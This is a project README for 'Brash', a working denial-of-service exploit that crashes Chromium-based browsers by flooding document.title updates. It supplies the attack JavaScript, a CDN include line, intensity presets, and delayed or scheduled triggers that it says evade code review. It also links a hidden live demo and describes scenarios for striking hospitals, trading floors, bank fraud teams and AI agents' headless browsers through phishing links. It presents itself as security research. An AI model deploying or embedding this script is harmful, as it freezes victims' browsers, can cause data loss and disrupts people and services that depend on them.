# Brash

![Brash by Jose Pino](images/brash-cover.png)

## Chromium Browser DoS Attack via document.title Exploitation

**Brash** is a critical vulnerability in **[Blink](https://www.chromium.org/blink/)**, the rendering engine that powers Google's Chromium-based browsers. It allows any Chromium browser to collapse in 15-60 seconds by exploiting an architectural flaw in how certain DOM operations are managed.

The **attack vector** originates from the complete absence of rate limiting on `document.title` API updates. This allows injecting **millions of DOM mutations per second**, and during this injection attempt, it saturates the main thread, disrupting the event loop and causing the interface to collapse. The impact is significant, it consumes high CPU resources, degrades overall system performance, and can **halt or slow down other processes** running simultaneously. By affecting Chromium browsers on desktop, Android, and embedded environments, this vulnerability exposes over **3 billion people** on the internet to system-level denial of service.

**STATUS:** Operational  
**AFFECTED VERSIONS:** Chromium ≤ 143.0.7483.0 (tested: 138.0.7204.251, 141.0.7390.108, 143.0.7483.0)

> [!NOTE]
> The exploit is currently operational. Once the vulnerability is patched, this code will cease to work. Regardless, discovering this architectural flaw and completing the entire research, documentation, and design process to share something impactful with the world has been an incredibly rewarding journey.

## Testing

11 major browsers were tested on macOS, Windows, and Linux to validate the vulnerability's impact.

### Vulnerable (Chromium/Blink)

All Chromium-based browsers are vulnerable because the flaw exists in the core of the Blink rendering engine:

- **Chrome** — crashes in 15-30 seconds
- **Edge** — crashes in 15-25 seconds  
- **Vivaldi** — crashes in 15-30 seconds
- **Arc Browser** — crashes in 15-30 seconds
- **Dia Browser** — crashes in 15-30 seconds
- **Opera** — crashes in ~60 seconds
- **Perplexity Comet** — crashes in 15-35 seconds
- **ChatGPT Atlas** — crashes in 15-60 seconds
- **Brave** — crashes in 30-125 seconds 

### Not Vulnerable (Using Other Engines)

- **Firefox** (Gecko engine) — immune to the attack
- **Safari** (WebKit engine) — immune to the attack
- **iOS browsers** (all use WebKit) — immune to the attack due to Apple's mandatory policy requiring all iOS browsers to use WebKit as their rendering engine, making Chromium-based browsers impossible on iOS

## How It Works

**Brash** exploits a fundamental architectural flaw in the Blink rendering engine: the absence of throttling on `document.title` updates. The attack operates in three critical phases:

### 1. Hash Generation (Preparation)

Generates 100 unique hexadecimal strings of 512 characters and stores them in memory before starting the attack.

**Why pre-load them instead of generating them in real-time?**

Because constantly generating new strings consumes CPU time on mathematical operations. That time is critical—every millisecond spent generating strings is time NOT used to bombard the browser with `document.title` updates.

By having 100 strings already loaded in memory:
- **Faster attack**: No pauses to generate strings
- **Focused CPU**: 100% of resources dedicated to saturating the browser
- **Fewer system pauses**: Prevents the garbage collector from constantly activating
- **Avoids detection**: The 100 different strings prevent the browser from caching or optimizing updates

> As a result, we achieve maximum injection speed with maximum memory consumption per update.

```javascript
// Generates high-entropy unique IDs
gid: function() {
    let id = "";
    for (let i = 0x0; i < 0x200; i++) {
        id += ((Math.random() * 0x10) | 0x0).toString(0x10);
    }
    return id;
}
```

### 2. Burst Injection (Attack)

Executes configurable bursts of title updates. With default configuration (burst: 8000, interval: 1ms), it attempts to inject approximately **24 million updates per second**, and it's during this attempt that the browser collapse begins.

```javascript
// Triple-update pattern: maximizes rendering pipeline thrashing
inject: function() {
    const t = this.titles[Math.random() * this.titles.length | 0x0];
    for (let i = 0x0; i < 0x3; i++) {
        document.title = t + i;  // Each burst performs 3 sequential updates
    }
    this.counter += 0x3;
}
```

### 3. UI Thread Saturation (Collapse)

Continuous updates saturate the browser's main thread, preventing the processing of other events:

**Collapse timeline:**
- **0-5s**: Initial UI thread saturation, extreme CPU consumption
- **5-10s**: Tab completely frozen, impossible to close
- **10-15s**: Browser collapse or "Page Unresponsive" dialog
- **15-60s**: Forced termination required (Chromium-based browsers)

**Why does it work?**

Blink processes each `document.title` change synchronously on the main thread without rate limiting. This creates a bottleneck that:
- Blocks the event loop
- Prevents user input processing
- Saturates memory with long strings
- Disrupts the compositor and rendering pipeline
- Causes browser process thrashing

## Demo & PoC

To fully understand the impact of **Brash**, you can experience the exploit in different contexts, from a controlled live demo to your own implementation. Each option is designed for different levels of interaction and technical understanding.

### 1. Live Demo

The fastest way to see **Brash** in action. Visit **https://brash.run**

> To see the exploit without a graphical interface, visit **https://brash.run/hidden-live-demo.html**. This version executes the injection invisibly, simulating a real attack.

### 2. Local Demo

If you prefer to run the demo in your own environment, the [exploit-demo/](exploit-demo/) directory included in the repository allows you to:
- Controls to adjust attack intensity in real-time
- Visual counter of updates per second
- Three predefined modes: moderate, aggressive, and extreme
- Observation of progressive browser collapse

Simply open `exploit-demo/index.html` in any Chromium browser and configure the `burst` and `interval` values before starting.

- **burstSize**: Title changes per interval (higher = more aggressive)
- **interval**: Milliseconds between bursts (lower = more aggressive)

### 3. Implement Your Own PoC

To integrate **Brash** into your own security testing or research, include the script and configure the attack:

**Include the script:**
```html
<!-- Local -->
<script src="brash.js"></script>

<!-- CDN -->
<script src="https://cdn.jsdelivr.net/gh/jofpin/brash/brash.js"></script>
```

**API Usage:**

```javascript
// 1. Immediate attack
Brash.run({
    burstSize: 8000,
    interval: 1
});

// 2. Delay in seconds (default)
Brash.run({
    burstSize: 8000,
    interval: 1,
    delay: 30  // 30 seconds
});

// 3. Delay with strings
Brash.run({
    burstSize: 8000,
    interval: 1,
    delay: "30s"  // or "5000ms" or "3m"
});

// 4. Scheduled attack
Brash.run({
    burstSize: 8000,
    interval: 1,
    scheduled: "2025-10-18T09:30:00"
});
```

**Intensity configurations:**

```javascript
// Moderate: controlled observation
// Effect: Browser responds slowly and allows observing gradual degradation
Brash.run({ 
    burstSize: 200,
    interval: 1000 // ~600 updates/sec
});

// Aggressive: rapid saturation
// Effect: Tabs freeze in 10-20 seconds
Brash.run({ 
    burstSize: 2000, 
    interval: 100 // ~60,000 updates/sec
});

// Extreme: instant collapse
// Effect: Immediate freeze, total crash in 15-30 seconds
Brash.run({ 
    burstSize: 8000,
    interval: 1 // Attempts ~24M updates/sec (browser collapses during the attempt)
});
```

> **Note**: Each burst executes 3 sequential `document.title` updates. For example, burstSize: 400 = 1,200 actual updates per interval.

## Attack Scenarios

**Brash** can be weaponized in multiple critical contexts with consequences ranging from economic losses to human life risk.

### Time-Delayed Attacks: Strategic Timing

A critical feature that amplifies **Brash**'s danger is its ability to be programmed to execute at specific moments. An attacker can inject the code with a **temporal trigger**, remaining dormant until a predetermined exact time.

**Technical implementation:**

```javascript
// Delay in seconds (default)
Brash.run({ burstSize: 8000, interval: 1, delay: 30 });

// Delay with strings (ms, s, m)
Brash.run({ burstSize: 8000, interval: 1, delay: "30s" });
Brash.run({ burstSize: 8000, interval: 1, delay: "5000ms" });

// Scheduled: executes at exact moment
Brash.run({ burstSize: 8000, interval: 1, scheduled: "2025-10-18T09:30:00" });
```

**Parameters:**

- `burstSize`: Updates per cycle
- `interval`: Milliseconds between cycles
- `delay`: Number (seconds) or string (`"30s"`, `"5000ms"`, `"3m"`)
- `scheduled`: ISO string or Date object

**Why the `delay` parameter is especially lethal:**

1. **Doesn't require knowing when they'll open the link**: Simply waits X seconds from when the victim opens the page.

2. **Time to establish trust**: During the waiting minutes, the victim interacts with seemingly legitimate content (forms, documents, videos).

3. **Evades initial inspection**: If someone quickly reviews the code, it appears inactive. The attack doesn't execute until later.

4. **Perfect psychological timing**: Waits until the victim is deeply involved in the task (middle of exam, middle of meeting, during critical procedure).

**Typical scenario with `delay`:**
```
00:00 - Victim opens link "Q4 Documents.pdf"
00:30 - Victim reviews documents, appears legitimate
02:00 - Victim shares screen in meeting with 50 people
03:00 - ATTACK EXECUTES - all browsers collapse
```

**Why the `scheduled` parameter is also devastating:**

1. **Surgical synchronization**: The attacker chooses the exact moment of maximum impact (market opening, peak operations time).

2. **Global coordinated attacks**: Multiple targets can be hit simultaneously in the same second.

3. **Evades prior detection**: The malicious code can be present days or weeks beforehand without executing, passing security reviews.

4. **Impossible to stop**: By the time the attack executes, it's too late to prevent it.

**Strategic timing examples:**
- **09:30 AM EST** — Wall Street opening (maximum trading volatility)
- **03:00 AM** — Hospital shift change (minimum staff, maximum vulnerability)
- **12:00 PM** — Peak air traffic time (maximum number of simultaneous flights)
- **Black Friday 00:00** — Online sales start (maximum e-commerce traffic)
- **During live events** — Presidential debates, Super Bowl, massive sporting events

This **kinetic timing** capability transforms **Brash** from a disruption tool into a **temporal precision weapon**, where the attacker controls not only the "what" and "where," but also the **"when"** with millisecond accuracy.

---

### AI Agent Poisoning: Automated Systems

**Scenario**: Enterprise systems that depend on AI agents for web scraping, market analysis, competitor monitoring, or customer support automation use headless browsers (Chromium/Puppeteer) to query thousands of websites daily. An attacker injects **Brash** into popular sites that these agents query.

During critical automated operations:
- An AI agent queries a compromised financial news site for market analysis
- **Brash** executes silently in the agent's headless browser
- The browser process collapses, stopping the entire analysis pipeline
- Downstream systems waiting for agent data enter timeout
- Automated trading/pricing decisions are blocked
- The monitoring system detects massive failures in multiple agents simultaneously
- Manual intervention is required to restart the entire agent infrastructure

**Amplified attack vectors:**
- **AI research assistants**: Agents that search and process web information for companies
- **Price monitoring bots**: E-commerce systems that track competitor prices
- **SEO analysis tools**: Services that crawl millions of pages for analysis
- **AI-powered customer support**: Chatbots that query web documentation in real-time
- **Automated compliance scanning**: Regulatory systems that monitor websites

**Real impact**: Paralysis of critical automated operations, economic losses from unmade decisions, massive degradation of AI-dependent services, infrastructure recovery costs, exposure of critical dependency on automated agents.

### Surgical Procedure Disruption: Life-Threatening

**Scenario**: A cardiovascular surgeon is performing a coronary bypass operation assisted by a web-based surgical navigation system (increasingly common in minimally invasive surgeries). The system provides real-time images, patient vital metrics, and guidance for robotic instruments.

During the most critical phase of the operation, a browser notification appears: "ALERT: Critical surgical system update - Apply now or the operation may fail."

Upon clicking in panic:
- The browser collapses instantly along with the surgical navigation system
- The surgeon loses visualization of guide images for 3-5 minutes
- Real-time vital signs disappear from the screens
- The medical team must improvise while restarting the system
- The patient is in critical risk during the collapse window

**Real impact**: Direct risk of patient death, potential for permanent damage, psychological trauma to the medical team, million-dollar lawsuits for technological negligence.

### Stock Exchange Flash Crash

**Scenario**: During Wall Street market opening, a malicious actor injects **Brash** into multiple channels simultaneously: Bloomberg Terminal web interface, institutional trader chat, and specialized forums. The link promises "Leak: Fed emergency meeting transcript - Rate cut confirmed."

In the first 30 seconds of trading (maximum liquidity):
- 200+ institutional traders click simultaneously
- Their web terminals collapse just as they place million-dollar orders
- Automated trading algorithms detect the sudden drop in activity as a "crash"
- Massive automatic sell-offs are triggered
- The market drops 5-7% in 90 seconds before circuit breakers
- Millions of retail investors lose savings

**Real impact**: Trillions of dollars in market capitalization losses, global financial panic, SEC investigations, potential confidence crisis in markets.

### Banking System: Real-Time Fraud Prevention

**Scenario**: Fraud analysts at a bank process suspicious transaction alerts in real-time through a web dashboard. During Black Friday (transaction peak), they receive **Brash** via corporate email: "New fraud pattern detected - urgent analysis required."

At the moment of highest transactional volume:
- 20+ analysts open the link simultaneously
- Fraud detection dashboards collapse
- 15-20 minutes of transactions go unreviewed
- Attackers exploit the window to process thousands of stolen transactions
- $2-5 million in fraud passes undetected
- Automated systems are configured to allow transactions if analysts don't respond

**Real impact**: Millions of dollars in direct losses, thousands of customers with fraudulent charges, massive reputational damage, regulatory fines for prevention system failures.

---

> These scenarios are not theoretical. The simplicity of **Brash** makes it a real threat to any operation that depends on web browsers, which in 2025 means practically everything.

## Final Remarks

The creation of **Brash** is an effort to demonstrate what happens when basic protections are absent in the web technologies we use daily. The vulnerability doesn't lie in complex code or advanced techniques, but in the fundamental lack of rate limiting on an API that should be throttled by design.

The impact of **Brash** on over 3 billion Chromium browser users demonstrates that architectural flaws in core components like Blink have massive and global consequences. This is not an isolated bug—it's a design flaw that affects the entire Chromium ecosystem.

> **Often, the most dangerous things hide in the least expected place, the most ignored one.** - [Jose Pino](https://x.com/jofpin)

## Disclaimer

This PoC is intended solely for educational and security research purposes to help make the internet a safer place. Its execution should be carried out exclusively in controlled environments, and it must not be used on production systems, public websites, or devices containing important data.

Misuse of this exploit can result in browser crashes, data loss, and system instability. The author is not responsible for any damages, data loss, or legal consequences arising from the use or misuse of this PoC. By using **Brash**, you acknowledge understanding these risks and agree to use it only for legitimate security research in isolated environments.

Users are expected to comply with all applicable laws and regulations. Unauthorized use of this exploit against systems you do not own or have explicit permission to test is illegal and unethical.

## License

The content of this project itself is licensed under the [Creative Commons Attribution 3.0 license](http://creativecommons.org/licenses/by/3.0/us/deed.en_US), and the underlying source code used to format and display that content is licensed under the [MIT license](LICENSE).

Copyright (c) 2025 by [**Jose Pino**](https://x.com/jofpin)